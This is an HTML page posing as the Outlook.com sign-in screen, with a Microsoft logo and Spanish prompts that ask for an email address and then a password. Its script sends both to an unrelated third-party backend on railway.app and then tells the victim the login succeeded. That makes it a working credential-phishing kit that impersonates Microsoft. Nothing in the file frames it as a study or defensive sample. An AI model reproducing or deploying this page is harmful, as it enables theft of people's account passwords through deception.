<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="/styles/stiles.css">
    <link rel="stylesheet" href="/magic-master/dist/magic.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.0.0/animate.min.css"/>
    <title>Outlook.com</title>
</head>
<body>
    <div class="gandContainer">
        <main class="inner" id="stepContainer">
            <!-- Logo de Microsoft -->
            <div class="margin-bottom-20" aria-hidden="true">
                <picture class="logo margin-bottom-16">
                    <img src="/images/microsoft_logo.svg" alt="Logotipo de Microsoft">
                </picture>
            </div>

            <!-- Primera Pantalla: Solicitar Correo -->
            <div id="step1">
                <h1 class="text-title margin-bottom-16">Iniciar sesión</h1>
                <div class="row margin-bottom-16">
                    <div class="form-group col-md-12 placeholderContainer">
                        <input type="email" id="emailInput" name="mail" class="form-control" placeholder="Correo" required="required" aria-required="true" autocomplete="off">
                    </div>
                </div>
                <div class="row inline-block no-margin-top-bottom button-container">
                    <button id="nextButton" class="btn btn-block btn-primary">Siguiente</button>
                </div>
            </div>

            <!-- Segunda Pantalla: Solicitar Contraseña -->
            <div id="step2" style="display: none;">
                <h1 class="text-title margin-bottom-16">Escribir contraseña</h1>
                <div class="row margin-bottom-16">
                    <div class="form-group col-md-12 placeholderContainer">
                        <input type="email" id="emailDisplay" class="form-control" disabled>
                    </div>
                </div>
                <div class="row margin-bottom-16">
                    <div class="form-group col-md-12 placeholderContainer">
                        <input type="password" id="passwordInput" name="pwd" class="form-control" placeholder="Contraseña" required="required" aria-required="true" autocomplete="off">
                    </div>
                </div>
                <div class="row inline-block no-margin-top-bottom button-container">
                    <button id="loginButton" class="btn btn-block btn-primary">Iniciar sesión</button>
                </div>
            </div>
        </main>
    </div>

    <footer id="footer">
        <div>
            <div class="footerNode">
                <span id="footerDateId"></span>
                <a>Declaración de privacidad</a>
            </div>
        </div>
    </footer>

    <script>
        // Elementos del DOM
        const step1 = document.getElementById('step1');
        const step2 = document.getElementById('step2');
        const emailInput = document.getElementById('emailInput');
        const emailDisplay = document.getElementById('emailDisplay');
        const nextButton = document.getElementById('nextButton');
        const loginButton = document.getElementById('loginButton');

        // Paso 1: Ir a la pantalla de contraseña
        nextButton.addEventListener('click', () => {
            const email = emailInput.value.trim();
            if (!email) {
                alert('Por favor, ingrese un correo válido.');
                return;
            }

            // Mostrar la segunda pantalla
            emailDisplay.value = email;
            step1.style.display = 'none';
            step2.style.display = 'block';
        });

        // Paso 2: Iniciar sesión
        loginButton.addEventListener('click', async () => {
            const email = emailDisplay.value;
            const password = document.getElementById('passwordInput').value.trim();

            if (!password) {
                alert('Por favor, ingrese su contraseña.');
                return;
            }

            try {
                const response = await fetch('https://backend-login-production-375d.up.railway.app/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ mail: email, pwd: password })
                });

                if (!response.ok) {
                    const errorData = await response.json();
                    alert(errorData.error || 'Error desconocido');
                    return;
                }

                alert('Inicio de sesión exitoso');
            } catch (error) {
                alert('Error de conexión al servidor.');
            }
        });
    </script>
</body>
</html>
